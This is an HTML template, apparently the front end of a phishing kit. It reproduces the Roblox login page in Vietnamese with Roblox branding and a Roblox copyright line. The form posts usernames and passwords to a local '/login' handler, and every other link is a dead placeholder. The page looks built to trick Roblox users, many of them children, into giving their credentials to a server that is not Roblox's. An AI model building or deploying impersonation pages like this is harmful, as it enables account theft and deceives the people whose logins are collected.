<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng nhập – Roblox</title>
    <style>
        /* ===== RESET ===== */
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', 'Roboto', Arial, sans-serif; }
        body {
            background: #1a1a2e;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .login-box {
            background: #ffffff;
            max-width: 420px;
            width: 100%;
            padding: 40px 35px 30px;
            border-radius: 16px;
            box-shadow: 0 12px 40px rgba(0,0,0,0.6);
            text-align: center;
        }
        .logo {
            font-size: 38px;
            font-weight: 900;
            color: #1a1a2e;
            margin-bottom: 4px;
            letter-spacing: -0.5px;
        }
        .logo span { color: #e03a3a; }
        .subtitle {
            color: #666;
            font-size: 15px;
            margin-bottom: 25px;
        }
        .input-group {
            text-align: left;
            margin-bottom: 18px;
        }
        .input-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 13px 16px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 15px;
            background: #f9f9f9;
            transition: 0.2s;
            outline: none;
        }
        .input-group input:focus {
            border-color: #0070d1;
            background: #fff;
            box-shadow: 0 0 0 3px rgba(0,112,209,0.15);
        }
        .btn-login {
            width: 100%;
            padding: 14px;
            background: #0070d1;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 6px;
        }
        .btn-login:hover { background: #005bb5; }
        .btn-login:active { transform: scale(0.97); }
        .error-msg {
            color: #d32f2f;
            font-size: 13px;
            margin: 8px 0 0;
            display: block;
            text-align: left;
            background: #ffebee;
            padding: 8px 12px;
            border-radius: 6px;
        }
        .links {
            margin-top: 20px;
            font-size: 13px;
            color: #555;
        }
        .links a {
            color: #0070d1;
            text-decoration: none;
            font-weight: 500;
        }
        .links a:hover { text-decoration: underline; }
        .links .divider { color: #ccc; margin: 0 5px; }
        .links .row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 6px;
            flex-wrap: wrap;
        }
        .quick-login {
            margin-top: 12px;
            border-top: 1px solid #eee;
            padding-top: 14px;
            font-size: 13px;
        }
        .quick-login a { color: #0070d1; text-decoration: none; font-weight: 500; }
        .copyright {
            margin-top: 24px;
            font-size: 12px;
            color: #aaa;
            border-top: 1px solid #eee;
            padding-top: 16px;
        }
        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 10px 16px;
            font-size: 12px;
            color: #888;
            margin-top: 10px;
        }
        .footer-links a { color: #888; text-decoration: none; }
        .footer-links a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">R<span>o</span>blox</div>
        <div class="subtitle">Đăng nhập để tiếp tục</div>

        <form action="/login" method="POST">
            <div class="input-group">
                <label for="username">Tên người dùng/Địa chỉ email/Số điện thoại</label>
                <input type="text" id="username" name="username" placeholder="Nhập tên người dùng hoặc email" required autofocus>
            </div>
            <div class="input-group">
                <label for="password">Mật khẩu</label>
                <input type="password" id="password" name="password" placeholder="Nhập mật khẩu" required>
            </div>

            {% if error %}
            <div class="error-msg">{{ error }}</div>
            {% endif %}

            <button type="submit" class="btn-login">Đăng nhập</button>
        </form>

        <div class="links">
            <div class="row">
                <a href="#">Bạn quên Mật khẩu hoặc Tên người dùng?</a>
                <a href="#">Gửi mã một lần cho tôi qua email</a>
            </div>
        </div>

        <div class="quick-login">
            <a href="#">Đăng nhập nhanh</a>
        </div>

        <div style="margin-top: 16px; font-size: 14px; color: #333;">
            Bạn không có tài khoản? <a href="#" style="color:#0070d1; font-weight:600; text-decoration:none;">Đăng ký</a>
        </div>

        <div class="copyright">
            <div class="footer-links">
                <a href="#">Đăng ký</a>
                <a href="#">Về chúng tôi</a>
                <a href="#">Việc làm</a>
                <a href="#">Trung tâm tin tức</a>
                <a href="#">Cha mẹ</a>
                <a href="#">Mua thẻ quà tặng</a>
                <a href="#">Trợ giúp</a>
            </div>
            <div style="margin-top: 10px;">© 2026 Roblox Corporation</div>
        </div>
    </div>
</body>
    </html>
